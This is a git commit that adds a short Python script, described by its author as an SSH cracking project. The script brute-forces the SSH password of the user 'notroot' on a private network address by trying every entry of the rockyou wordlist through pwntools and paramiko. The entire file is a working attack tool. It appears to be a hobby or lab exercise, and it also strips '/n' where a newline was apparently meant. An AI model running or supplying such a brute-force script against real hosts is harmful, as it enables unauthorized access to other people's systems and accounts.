3430acf8a28a3c325549976d5a4a3f7a9715533a
Ray Fochler <rrgunsite@gmail.com>
2023-10-01 20:26:38 -0400

    Add files via upload
    Python project for ssh cracking. Using pwntools and paramiko modules.

---
+++ ssh_crack_project.py
@@ -0,0 +1,24 @@
+#! /usr/bin/python3
+
+# imports
+from pwn import *
+import paramiko
+
+host =  "192.168.0.4"
+username = "notroot"
+attempts = 0
+
+with open("/usr/share/wordlists/rockyou.txt", "r") as password_list:
+    for password in password_list:
+      password = password.strip("/n")
+      try:
+        print ("[{}] Attempting password: '{}'!".format(attempts, password))
+        response = ssh(host=host, user=username, password=password, timeout=1)
+        if response.connected():
+           print("[>]Valid password found: '{}'!".format(password))
+           response.close()
+           break
+        response.close()
+      except paramiko.ssh_exception.AuthenticationException:
+           print("[X] Invalid password!")
+      attempts +=1
